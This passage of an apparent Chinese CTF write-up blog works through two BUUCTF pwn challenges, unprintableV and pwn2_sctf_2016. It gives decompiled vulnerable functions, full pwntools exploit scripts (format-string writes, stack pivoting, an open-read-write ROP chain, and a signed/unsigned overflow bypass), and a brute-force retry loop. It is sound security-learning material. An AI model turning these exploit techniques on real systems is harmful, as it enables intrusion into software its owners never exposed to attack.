<h4 id="strncmp-str1-str2-n"><a href="#strncmp-str1-str2-n" class="headerlink" title="strncmp(str1,str2,n)"></a>strncmp(str1,str2,n)</h4><p>比较str1,str2前n个字母是否相同,逐个比较,有不同就返回差值</p>
<p>相同的话返回值就是0</p>
<p>vuln</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x12C</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  --time; <span class="comment">//动调的时候看到这个time设置的是64</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路</p>
<ul>
<li>首先,有沙盒这一题一定会用orw</li>
<li>给了一个退出条件,当buf前六个字符是d^3CTF的时候,提供了栈迁移的条件</li>
<li>给了一个栈的地址,可以用格式化字符串修改栈上的值</li>
<li>因为题目没有libc,找不到open函数,这一题必须要改stdout为stderror,让printf回显</li>
<li>栈不可执行同时还有pie,我们需要写ROP在bss,然后通过栈迁移,回到bss段运行</li>
</ul>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27; </span></span><br><span class="line">file_path = <span class="string">&#x27;./unprintableV&#x27;</span></span><br><span class="line">context(binary=file_path, os=<span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">_debug_ = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    <span class="comment">#io = process(file_path)</span></span><br><span class="line">    <span class="comment">#libc =ELF(&quot;/lib/i386-linux-gnu/libc-2.27.so&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26838</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./buulibc/libc-2.27-x64.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span>(<span class="params">io</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;gift: &quot;</span>)</span><br><span class="line">    stack = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    tar_rbp = stack + <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">&quot;stack =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stack))) <span class="comment"># 题目给的stack</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;test!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(stack &amp; <span class="number">0xff</span>) + <span class="string">&quot;c%6$hhn&quot;</span> <span class="comment"># 通过动调先把stdout改成stderror</span></span><br><span class="line">    <span class="comment">#payload +=   # hhn</span></span><br><span class="line">    <span class="comment">#log.success(&quot;libc_base =&gt; &#123;&#125;&quot;.format(hex(libc_base)))</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x12c</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">0x20</span>) + <span class="string">&quot;c%10$hhn&quot;</span> <span class="comment"># 修改buf(xx60)为stdout(xx20),就差一个字节</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x12c</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">0x680</span>) + <span class="string">&quot;c%9$hn&quot;</span> <span class="comment"># 修改stdout为stderr,改为0x0680</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x12c</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;aa&quot;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x12c</span>,<span class="string">&quot;\x00&quot;</span>) <span class="comment"># 用来测试有没有修改成功</span></span><br><span class="line">    io.send(payload)</span><br><span class="line">    x = io.recvuntil(<span class="string">&quot;aa&quot;</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;aa&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> x:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;retry&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;%9$p&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;%15$p&quot;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x12c</span>,<span class="string">&quot;\x00&quot;</span>) <span class="comment"># 泄露libc地址和程序基址,这里直接泄露了buf的位置,相当于泄露基址</span></span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    gdb.attach(io,<span class="string">&quot;break printf&quot;</span>)</span><br><span class="line"></span><br><span class="line">    buf = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>) + <span class="number">0x40</span></span><br><span class="line">    libc_base = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">231</span> - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(tar_rbp &amp; <span class="number">0xff</span>) + <span class="string">&quot;c%12$hhn&quot;</span> <span class="comment"># 这里开始调整两条rbp链</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x12c</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((tar_rbp+<span class="number">0x10</span>) &amp; <span class="number">0xff</span>) + <span class="string">&quot;c%6$hhn&quot;</span>  <span class="comment"># 这个是目标rbp链的最后一个字节在这里先改了最后一个字节</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x12c</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(((tar_rbp+<span class="number">0x8</span>) &amp; <span class="number">0xff</span>)+<span class="number">0x1</span>) + <span class="string">&quot;c%10$hhn&quot;</span> <span class="comment"># 这里在设置第一条rbp链指向需要改的rbp的位置,单字节修改了三个字节</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x12c</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((tar_rbp&gt;&gt;<span class="number">8</span>) &amp; <span class="number">0xff</span>) + <span class="string">&quot;c%12$hhn&quot;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x12c</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(((tar_rbp+<span class="number">0x8</span>) &amp; <span class="number">0xff</span>)+<span class="number">0x2</span>) + <span class="string">&quot;c%10$hhn&quot;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x12c</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((tar_rbp&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xff</span>) + <span class="string">&quot;c%12$hhn&quot;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x12c</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((tar_rbp+<span class="number">0x8</span>) &amp; <span class="number">0xff</span>) + <span class="string">&quot;c%10$hhn&quot;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x12c</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">&quot;buf =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(buf)))</span><br><span class="line">    log.success(<span class="string">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">    log.success(<span class="string">&quot;tar_rbp =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(tar_rbp)))</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((buf + <span class="number">0x8</span>)&amp;<span class="number">0xffff</span>) + <span class="string">&quot;c%43$hn&quot;</span>  <span class="comment"># 可以看到第二条rbp链隔得比较远</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x12c</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((tar_rbp &amp; <span class="number">0xff</span>) + <span class="number">0x2</span>) + <span class="string">&quot;c%12$hhn&quot;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x12c</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(((buf+<span class="number">0x8</span>)&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>) + <span class="string">&quot;c%43$hn&quot;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x12c</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((tar_rbp &amp; <span class="number">0xff</span>) + <span class="number">0x4</span>) + <span class="string">&quot;c%12$hhn&quot;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x12c</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((((buf+<span class="number">0x8</span>)&gt;&gt;<span class="number">16</span>)&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>) + <span class="string">&quot;c%43$hn&quot;</span> <span class="comment"># 到这里就修改完毕</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x12c</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(io,&quot;break printf&quot;)</span></span><br><span class="line"></span><br><span class="line">    open_libc = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    read_libc = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    write_libc = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    pop_rdi = libc_base + <span class="number">0x215bf</span></span><br><span class="line">    pop_rsi = libc_base + <span class="number">0x23eea</span></span><br><span class="line">    pop_rdx = libc_base + <span class="number">0x1b96</span></span><br><span class="line"></span><br><span class="line">    flag_addr = buf + <span class="number">0xd0</span></span><br><span class="line">    flag_size = <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;d^3CTF&quot;</span> + <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># d^3CTF用于退出menu</span></span><br><span class="line">    payload += <span class="string">&quot;flag&quot;</span> + <span class="string">&quot;\x00\x00\x00\x00&quot;</span> <span class="comment"># 这一段没有用</span></span><br><span class="line"></span><br><span class="line">    payload += p64(pop_rdi) + p64(flag_addr)</span><br><span class="line">    payload += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(pop_rdx) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(open_libc)</span><br><span class="line">    payload += p64(pop_rdi) + p64(<span class="number">1</span>) <span class="comment"># 注意这个fd</span></span><br><span class="line">    payload += p64(pop_rsi) + p64(flag_addr + <span class="number">0x200</span>)</span><br><span class="line">    payload += p64(pop_rdx) + p64(flag_size)</span><br><span class="line">    payload += p64(read_libc)</span><br><span class="line">    payload += p64(pop_rdi) + p64(<span class="number">2</span>) <span class="comment"># 注意这个fd</span></span><br><span class="line">    payload += p64(pop_rsi) + p64(flag_addr + <span class="number">0x200</span>)</span><br><span class="line">    payload += p64(pop_rdx) + p64(flag_size)</span><br><span class="line">    payload += p64(write_libc)</span><br><span class="line">    payload = payload.ljust(<span class="number">0xd0</span>)</span><br><span class="line">    payload += <span class="string">&quot;./flag\x00&quot;</span></span><br><span class="line"></span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./unprintableV&quot;</span>)</span><br><span class="line">        <span class="comment"># io = process(&quot;./unprintableV&quot;, env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line">        crack(io)</span><br><span class="line">    <span class="keyword">except</span> BaseException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        io.kill()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;retrying&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="orw的一些额外注意事项以及爆破脚本"><a href="#orw的一些额外注意事项以及爆破脚本" class="headerlink" title="orw的一些额外注意事项以及爆破脚本"></a>orw的一些额外注意事项以及爆破脚本</h4><p>注意:</p>
<ol>
<li><p>最开始修改stdout的时候,因为栈上有buf的地址,buf和stdout离的很近,偏移相差一个字节可以直接修改,因为printf需要用到stdout所以只能通过这种方式一次性修改完stdout</p>
</li>
<li><p>修改stdout为stderror差了三个十六进制位(1.5字节),但是用两个字节修改的话,可能因为太大的原因,会修改失败,这里改了三个字节,最后一个字节爆破了</p>
</li>
<li><p>因为bss段无执行权限,所以利用栈迁移,覆盖rbp的值,这里用了两条不同的rbp链,修改了menu返回地址上面的那个rbp,这样menu结束的leave_ret把rop给了rsp,main函数结束的leave_ret就可以执行rop的内容了,<strong>注意如果我们劫持的是返回地址,直接返回到rop的位置,rop会被当成指令执行!</strong></p>
</li>
<li><p>rop的位置在buf+0x10,因为ret的原因,我们rsp劫持的时候需要劫持到buf+0x8,然后执行buf+0x10,原本”flag\x00”是设置在buf+0x8的位置的,发现ret以后会改动这里的数据,就放到后面了(buf+0xd0)</p>
</li>
<li><p>orw的一些注意事项</p>
<ol>
<li>这里关闭了标准输出流(fd = 1),所以open函数的返回值(一个文件描述符fd),会使用这个空缺的1的位置,而不是之前的3,这题同上面babyfmt,现在才搞懂</li>
<li>因为关闭了标准输出流,调用的是libc里面的write函数,所以不会用got表的stdout,也就是我们之前改的stderr,这里直接设置第一个参数为二,直接用stderr输出</li>
<li>read函数是将文件描述符对应的文件,或者IO流输入到第二个参数buf的位置,然后通过write调用相同的地方输出,这里注意到buf不在bss段,在rodate段,特意写到了bss段上(有读写权限)</li>
</ol>
</li>
<li><p>爆破脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span>(<span class="params">io</span>):</span></span><br><span class="line">    <span class="comment"># raise Exception(&#x27;retry&#x27;)</span></span><br><span class="line">    <span class="comment"># 这里需要根据不同的题目,自己设置报错,让x</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./unprintableV&quot;</span>)</span><br><span class="line">        <span class="comment"># io = process(&quot;./unprintableV&quot;, env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line">        crack(io)  <span class="comment"># crack函数是自己写的exp脚本</span></span><br><span class="line">    <span class="keyword">except</span> BaseException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        io.kill()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;retrying&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h3><p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vuln</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char nptr[<span class="number">32</span>]; // [esp+1Ch] [ebp-2Ch] BYREF</span><br><span class="line">  <span class="built_in">int</span> v2; // [esp+3Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  printf(<span class="string">&quot;How many bytes do you want me to read? &quot;</span>);</span><br><span class="line">  get_n(nptr, 4u);</span><br><span class="line">  v2 = atoi(nptr);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">return</span> printf(<span class="string">&quot;No! That size (%d) is too large!\n&quot;</span>, v2);</span><br><span class="line">  printf(<span class="string">&quot;Ok, sounds good. Give me %u bytes of data!\n&quot;</span>, v2);</span><br><span class="line">  get_n(nptr, v2);</span><br><span class="line">  <span class="keyword">return</span> printf(<span class="string">&quot;You said: %s\n&quot;</span>, nptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>get_n</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">get_n</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( !v4 || v4 == <span class="number">10</span> || i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v2 = i;</span><br><span class="line">    *(_BYTE *)(v2 + a1) = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  result = a1 + i;</span><br><span class="line">  *(_BYTE *)(a1 + i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="整型类型转换的漏洞"><a href="#整型类型转换的漏洞" class="headerlink" title="整型类型转换的漏洞"></a>整型类型转换的漏洞</h4><p>可以看到上面用atoi读入的是一个有符号整数,但是get_n的参数是无符号的,我们可以读入一个负数这样就可以绕过小于32的检验,然后照常栈溢出即可</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">file_path = <span class="string">&#x27;./pwn2_sctf_2016&#x27;</span></span><br><span class="line">context(binary=file_path, os=<span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;-F&#x27;</span> <span class="string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="string">&#x27;-P&#x27;</span>]</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">_debug_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    io = process(file_path)</span><br><span class="line">    libc =ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc-2.27.so&quot;</span>)</span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29147</span>)</span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.27-x64.so&quot;)</span></span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.27-x86.so&quot;)</span></span><br><span class="line">    <span class="comment">#libc = ELF(&quot;/home/youyue271/Desktop/buulibc/libc-2.23-x64.so&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&quot;/home/youyue271/Desktop/buulibc/libc-2.23-x86.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;break main\n&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(io, cmd)</span></span><br><span 